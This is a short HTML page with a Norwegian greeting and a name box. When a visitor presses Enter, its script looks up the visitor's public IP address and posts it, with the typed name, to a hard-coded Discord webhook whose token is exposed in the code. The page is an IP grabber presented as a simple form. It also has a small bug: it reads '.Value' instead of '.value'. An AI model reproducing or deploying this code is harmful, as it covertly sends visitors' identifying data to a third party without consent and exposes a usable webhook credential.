<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <h1>Hei</h1>
    <input type="text" placeholder="Skriv navn" name="" id="name">
    <script>
        document.getElementById('name').addEventListener('keyup', async (e) => {
            if (e.key == 'Enter') {
                async function ip() {
                    const response = await fetch('https://api.ipify.org')
                    const data = await response.text()
                    return data
                }
                async function post(data) {
                    fetch('https://discord.com/api/webhooks/1459698185462222849/R94pDO5sIJtBP6N0UuWKUKiHJUCaLeQpsnNplIj_oiBphf6UAgm6eR7oWzAvd8Ar3--N', {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify(data)
                    })
                }
                const IP = await ip()
                const data = {
                    content: `${document.getElementById('name').Value}: ${IP}`
                }
                document.getElementsByTagName('h1')[0].innerText = IP
                await post(data)
            }
        })
    </script>
</body>

</html>
